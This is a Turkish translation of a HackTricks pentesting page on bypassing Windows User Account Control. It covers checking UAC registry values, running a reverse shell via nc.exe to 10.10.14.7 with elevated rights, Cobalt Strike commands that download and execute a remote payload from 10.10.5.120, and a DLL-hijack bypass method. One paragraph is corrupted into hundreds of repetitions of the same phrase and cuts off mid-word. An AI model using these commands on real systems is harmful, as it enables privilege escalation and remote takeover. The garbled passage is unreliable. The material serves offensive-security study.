# UAC - Kullanıcı Hesabı Kontrolü

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hackleme becerilerini öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerine göz atın**](https://peass.creator-spring.com)
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubumuza**](https://discord.gg/hRep4RUj7f) veya [**telegram grubumuza**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek katkıda bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş topluluk araçları** tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Kullanıcı Hesabı Kontrolü (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), yükseltilmiş faaliyetler için bir **izin istemi** sağlayan bir özelliktir. Uygulamalar farklı `bütünlük` seviyelerine sahiptir ve yüksek seviyede bir program, **sistemi potansiyel olarak tehlikeye atabilecek görevleri gerçekleştirebilir**. UAC etkinleştirildiğinde, uygulamalar ve görevler her zaman bir yönetici tarafından bu uygulamaların/görevlerin sisteme yönetici düzeyinde erişim sağlaması için açıkça yetkilendirilmediği sürece, her zaman bir yönetici olmayan hesabın güvenlik bağlamında çalışır. Bu, yöneticileri istenmeyen değişikliklerden koruyan bir kolaylık özelliğidir ancak bir güvenlik sınırı olarak kabul edilmez.

Daha fazla bütünlük seviyeleri hakkında bilgi için:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

UAC devredeyken, bir yönetici kullanıcıya 2 belirteç verilir: düzenli düzeydeki işlemleri düzenli düzeyde gerçekleştirmek için standart bir kullanıcı anahtarı ve yönetici ayrıcalıkları olan bir belirteç.

Bu [sayfa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), UAC'nin nasıl çalıştığıyla ilgili detaylı bilgileri içerir ve oturum açma işlemi, kullanıcı deneyimi ve UAC mimarisini içerir. Yöneticiler, yerel düzeyde (secpol.msc kullanarak) UAC'nin nasıl çalışacağını kuruluşlarına özgü olarak yapılandırmak için güvenlik politikalarını kullanabilir veya etkin bir şekilde yapılandırabilir ve etkin bir şekilde etkin bir şekilde yapılandırabilir ve etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde etkin bir şekilde et
### UAC Atlatma Teorisi

Bazı programlar, **kullanıcının** **yönetici grubuna ait olduğu** takdirde **otomatik olarak yükseltilir**. Bu ikili dosyaların içindeki _**Manifestolar**_ içinde _**autoElevate**_ seçeneği **True** değeriyle bulunur. Ayrıca ikili dosyanın **Microsoft tarafından imzalanmış** olması gerekir.

Ardından, **UAC**'yi atlamak (**orta** bütünlük seviyesinden **yüksek** seviyeye yükseltmek) için bazı saldırganlar, bu tür ikili dosyaları kullanarak **keyfi kodları yürütmeyi** tercih ederler çünkü bu kodlar **yüksek seviye bütünlük işleminden** yürütülecektir.

Bir ikili dosyanın _**Manifestosunu**_ kontrol etmek için Sysinternals'ten gelen _**sigcheck.exe**_ aracını kullanabilirsiniz. Ve işlemlerin **bütünlük seviyesini** görmek için _Process Explorer_ veya _Process Monitor_ (Sysinternals'ten) kullanabilirsiniz.

### UAC'yi Kontrol Et

UAC'nin etkin olup olmadığını doğrulamak için yapılacaklar:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Eğer **`1`** ise, UAC **etkinleştirilmiştir**, eğer **`0`** veya **mevcut değilse**, o zaman UAC **etkisizdir**.

Ardından, yapılandırılmış **hangi seviye**'nin kontrol edilmesi:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Eğer **`0`** ise, UAC soru sormaz (engellenmiş gibi)
* Eğer **`1`** ise yöneticiye yüksek haklarla bir uygulamayı çalıştırmak için kullanıcı adı ve şifre sorulur (Güvenli Masaüstü üzerinde)
* Eğer **`2`** (**Her zaman bildir**) UAC her zaman yöneticiye bir şeyi yüksek ayrıcalıklarla çalıştırmaya çalıştığında onayını sorar (Güvenli Masaüstü üzerinde)
* Eğer **`3`** ise `1` gibi ancak Güvenli Masaüstü üzerinde gerekli değil
* Eğer **`4`** ise `2` gibi ancak Güvenli Masaüstü üzerinde gerekli değil
* Eğer **`5`** (**varsayılan**) yöneticiye Windows dışı uygulamaları yüksek ayrıcalıklarla çalıştırmak için onayını sormak için sorar

Sonra, **`LocalAccountTokenFilterPolicy`** değerine bakmanız gerekmektedir.\
Eğer değer **`0`** ise, sadece **RID 500** kullanıcısı (**yerleşik Yönetici**) UAC olmadan **yönetici görevlerini gerçekleştirebilir**, ve eğer `1` ise, **"Yöneticiler"** grubundaki tüm hesaplar bunları yapabilir.

Ve son olarak **`FilterAdministratorToken`** anahtarının değerine bakın.\
Eğer **`0`**(varsayılan), **yerleşik Yönetici hesabı** uzaktan yönetim görevlerini yapabilir ve eğer **`1`** ise yerleşik Yönetici hesabı uzaktan yönetim görevlerini yapamaz, `LocalAccountTokenFilterPolicy` `1` olarak ayarlanmadıkça.

#### Özet

* Eğer `EnableLUA=0` veya **mevcut değilse**, **hiç kimse için UAC yok**
* Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=1` ise, Hiç kimse için UAC yok**
* Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=0` ve `FilterAdministratorToken=0`, RID 500 için (Yerleşik Yönetici) UAC yok**
* Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=0` ve `FilterAdministratorToken=1`, Herkes için UAC var**

Tüm bu bilgiler **metasploit** modülü kullanılarak toplanabilir: `post/windows/gather/win_privs`

Ayrıca kullanıcı gruplarınızı kontrol edebilir ve bütünlük seviyesini alabilirsiniz:
```
net user %username%
whoami /groups | findstr Level
```
## UAC atlatma

{% hint style="info" %}
Not: Eğer kurbanın grafik erişimi varsa, UAC atlatması oldukça basittir çünkü UAC uyarısı çıktığında sadece "Evet"e tıklamanız yeterlidir.
{% endhint %}

UAC atlatması aşağıdaki durumda gereklidir: **UAC etkinleştirilmişse, işleminiz orta bütünlük bağlamında çalışıyorsa ve kullanıcı grubunuz yöneticiler grubuna aitse**.

**UAC'nin en yüksek güvenlik seviyesinde (Her zaman) olduğunda atlatmak, diğer seviyelerden (Varsayılan) herhangi birinde olduğunda atlatmaktan çok daha zordur.**

### UAC devre dışı

Eğer UAC zaten devre dışı bırakılmışsa (`ConsentPromptBehaviorAdmin` **`0`**) şunun gibi bir şey kullanarak **yönetici ayrıcalıklarıyla (yüksek bütünlük seviyesi) ters kabuk çalıştırabilirsiniz**:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Token çoğaltma ile UAC atlatma

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Çok** Temel UAC "atlatma" (tam dosya sistemi erişimi)

Eğer Yöneticiler grubunda olan bir kullanıcıya sahip bir kabukunuz varsa, SMB aracılığıyla C$ paylaşımını **bağlayabilirsiniz** (dosya sistemi) ve yeni bir diskte yerel olarak monte edebilirsiniz ve dosya sistemi içindeki **her şeye erişebilirsiniz** (hatta Yönetici ana klasörüne bile).

{% hint style="warning" %}
**Bu hile artık çalışmıyor gibi görünüyor**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Cobalt Strike ile UAC atlatma

Cobalt Strike teknikleri, UAC maksimum güvenlik seviyesine ayarlanmamışsa çalışacaktır.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** ve **Metasploit** ayrıca **UAC**'yi **atlamak** için birkaç modüle sahiptir.

### KRBUACBypass

Belgeler ve araç [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC atlatma saldırıları

[**UACME**](https://github.com/hfiref0x/UACME) birkaç UAC atlatma saldırısının bir **derlemesi** olan. UACME'yi **visual studio veya msbuild kullanarak derlemeniz gerekecektir**. Derleme, birkaç yürütülebilir dosya oluşturacaktır (örneğin `Source\Akagi\outout\x64\Debug\Akagi.exe`), **hangisine ihtiyacınız olduğunu bilmelisiniz.**\
Bazı atlatmaların **kullanıcıya bir şeyler olduğunu bildiren diğer programları tetikleyebileceğinden** **dikkatli olmalısınız.**

UACME'nin her tekniğin çalışmaya başladığı **derleme sürümüne sahip olduğunu**. Sürümünüzü etkileyen bir teknik arayabilirsiniz:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
### UAC Kullanıcı Hesabı Kontrolü

Ayrıca, [bu](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) sayfadan Windows sürümü `1607`'yi derleme sürümlerinden alabilirsiniz.

#### Daha Fazla UAC Atlatma

Burada kullanılan **tüm** teknikler, UAC'yi atlamak için **kurbanla tam etkileşimli bir kabuk gerektirir** (genel bir nc.exe kabuğu yeterli değildir).

Bunu bir **meterpreter** oturumu kullanarak elde edebilirsiniz. **Session** değeri **1** olan bir **işlem**e geçiş yapın:

![](<../../.gitbook/assets/image (863).png>)

(_explorer.exe_ çalışmalı)

### GUI ile UAC Atlatma

Eğer bir **GUI'ye erişiminiz varsa, UAC isteğini** aldığınızda sadece kabul edebilirsiniz, gerçekten bir atlatıcıya ihtiyacınız yok. Bu nedenle, bir GUI'ye erişim sağlamak, UAC'yi atlatmanıza izin verecektir.

Ayrıca, birisi tarafından kullanılan bir GUI oturumuna erişirseniz (potansiyel olarak RDP aracılığıyla) **yönetici olarak çalışacak bazı araçlar** bulunmaktadır, buradan örneğin **cmd'yi** doğrudan **yönetici olarak çalıştırabilirsiniz** ve tekrar UAC tarafından sorgulanmadan [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) gibi. Bu biraz daha **gizli** olabilir.

### Gürültülü kaba kuvvet UAC atlatma

Gürültülü olmaktan endişe etmiyorsanız her zaman [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir şey çalıştırabilir ve kullanıcı izinlerini yükseltmeyi kabul edene kadar istemeyi **sürekli talep edebilirsiniz**.

### Kendi atlatıcınız - Temel UAC atlatma metodolojisi

**UACME'ye** bir göz atarsanız, **çoğu UAC atlatmanın Dll Hijacking zafiyetini** (genellikle kötü niyetli dll'yi _C:\Windows\System32_'ye yazma) istismar ettiğini göreceksiniz. [Bir Dll Hijacking zafiyeti bulmayı öğrenmek için bunu okuyun](../windows-local-privilege-escalation/dll-hijacking/).

1. **Otomatik yükselme** yapacak bir ikili bulun (çalıştırıldığında yüksek bütünlük seviyesinde çalıştığını kontrol edin).
2. **Procmon** ile **"NAME NOT FOUND"** olaylarını bulun ve **DLL Hijacking** için savunmasız olabilecek olayları belirleyin.
3. Muhtemelen, kötü niyetli DLL'yi bazı **korunan yollara** (örneğin C:\Windows\System32 gibi) yazmanız gerekecektir. Bunu aşmak için şunları kullanabilirsiniz:
   1. **wusa.exe**: Windows 7, 8 ve 8.1. Bu araç, yüksek bütünlük seviyesinden çalıştırıldığı için korunan yollara bir CAB dosyasının içeriğini çıkarmayı sağlar.
   2. **IFileOperation**: Windows 10.
4. DLL'nizi korunan yola kopyalamak ve savunmasız ve otomatik yükseltilmiş ikiliyi çalıştırmak için bir **betik** hazırlayın.

### Başka bir UAC atlatma tekniği

**Otomatik yükseltilmiş bir ikili**nin, **kayıttan** bir **ikilinin** veya **komutun** **adını/yolunu** okumaya çalışıp çalışmadığını izlemek (bu bilgiyi **HKCU** içinde arıyorsa daha ilginç olur).

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturun ve **otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
